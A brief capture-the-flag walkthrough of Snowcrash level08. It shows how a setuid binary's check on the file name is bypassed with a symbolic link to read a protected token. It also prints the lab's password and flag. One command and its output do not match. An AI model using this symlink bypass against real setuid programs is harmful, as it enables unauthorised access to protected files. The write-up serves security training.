# <center>Snowcrash level08</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>>-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08<br/>
>>-rw-------  1 flag08 flag08    26 Mar  5  2016 token

> $ ltrace ./level08
>>printf("%s [file to read]\n", "./level08")

>$ ./level08 token
>>You may not access 'token'

>$ echo "test" > /tmp/token<br/>
>$ ./level08 /tmp/script
>> You may not access '/tmp/token'

>$ echo "test" > /tmp/script<br/>
>$ ./level08 /tmp/script
>> test

- The protection is on the file name pass. We will create a symbolic link to get around the problem.

> $ ln -s ~/token /tmp/script</br>
> $ ./level08 /tmp/script
>>quif5eloekouj29ke0vouxean

> $ su flag08 <br/>
> $ quif5eloekouj29ke0vouxean
>> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f